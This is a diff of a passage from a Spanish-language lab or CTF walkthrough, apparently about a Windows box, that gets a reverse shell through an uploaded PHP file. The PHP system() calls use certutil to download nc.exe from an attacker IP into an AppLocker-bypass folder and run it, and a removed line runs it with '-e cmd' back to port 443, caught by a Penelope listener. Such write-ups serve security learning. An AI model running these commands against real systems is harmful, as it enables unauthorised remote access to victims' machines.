@@ -319,10 +319,20 @@ En el servidor que tenemos en escucha vemos cómo se tramita la petición así q
 Probaremos a subir un netcat a alguna ruta del sistema victima, esto lo podremos en una ruta del sistema en el que no haya problemas y podamos ejecutarlo, en este caso usaremos la ruta `C:\Windows\System32\spool\drivers\color` que esta ruta la encontramos en el github de `https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md`
 Nos crearemos un archivo llamado `rce.php`
 ```php
-system("certutil.exe -f -urlcache -split http://10.10.14.116/nc.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -e cmd 10.10.14.116 443");
+system("certutil.exe -f -urlcache -split http://10.10.14.116/nc.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe");
+```
+
+Despues deberemos de modificar el archivo y añadirle el siguiente contenido
+```php
+system("C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe");
 ```
 
 Nos pondremos en escucha ahora con [[PENELOPE]] y enviaremos la reverse shell
+```shell
+penelope -p 443
+```
+
+Obteniendo una shell como yoshihide
 
 
 
